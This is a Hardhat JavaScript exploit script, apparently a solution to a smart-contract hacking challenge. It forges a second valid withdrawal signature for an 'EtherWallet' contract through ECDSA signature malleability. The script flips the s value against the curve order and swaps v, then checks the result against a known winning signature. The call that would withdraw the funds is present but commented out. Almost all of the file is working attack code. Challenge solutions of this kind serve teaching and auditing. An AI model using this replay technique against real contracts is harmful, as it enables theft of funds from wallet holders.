const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();
    console.log("## ATTACK ACCOUNT: ", attacker.address);

    const contractAddress = "0x4b90946aB87BF6e1CA1F26b2af2897445F48f877";
    const ownerSignature = "0x53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c";
    const winnerSignature = "0x53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f29c45a4f96b836e03c8c75819cea64bcea2be24d663e9527d20673c866b06cdbc41b";

    //Get the contract
    const contractABI = [
        { "inputs": [], "stateMutability": "payable", "type": "constructor" },
        { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "_from", "type": "address" }, { "indexed": true, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Deposit", "type": "event" },
        { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "oldOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" },
        { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "_to", "type": "address" }, { "indexed": true, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Withdraw", "type": "event" },
        { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
        { "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "inputs": [{ "internalType": "bytes", "name": "", "type": "bytes" }], "name": "usedSignatures", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" },
        { "inputs": [{ "internalType": "bytes", "name": "signature", "type": "bytes" }], "name": "withdraw", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
        { "stateMutability": "payable", "type": "receive" }
    ];

    const etherWalletContract = new ethers.Contract(contractAddress, contractABI, attacker);

    const { v, r, s } = ethers.utils.splitSignature(ownerSignature);

    //The ECDSA s flip value according to openzeppelin
    const orderConst = ethers.BigNumber.from('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');

    //To generate the new s value we must check if it is greater or less than the orderConst to make the correct subtraction
    const newS = orderConst.gt(s) ? orderConst.sub(s) : ethers.BigNumber.from(s).sub(orderConst);

    //Flip the v value as well
    const newV = v == 27 ? 28 : 27;

    //I couldn't get ethers.utils.joinSignature to work, I'm not sure why. It may have s value verifications, which was the exception being thrown.
    //We must append the 0x at the beginning and remove it from the r and s values.
    const newValidSignature = "0x" + r.slice(2) + newS.toHexString().slice(2) + newV.toString(16);
    if (newValidSignature == winnerSignature) {
        console.log("## VALID SIGNATURE! Using the signature below, you would win if it hadn't already been hacked \n", newValidSignature);
    }

    //If you want to send the transaction anyway you can, it should tell you that it has already been used. I simply compare it to the winner signature to determine if we would win if we were first.
    //await etherWalletContract.withdraw(newValidSignature);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error);
        process.exit(1);
    });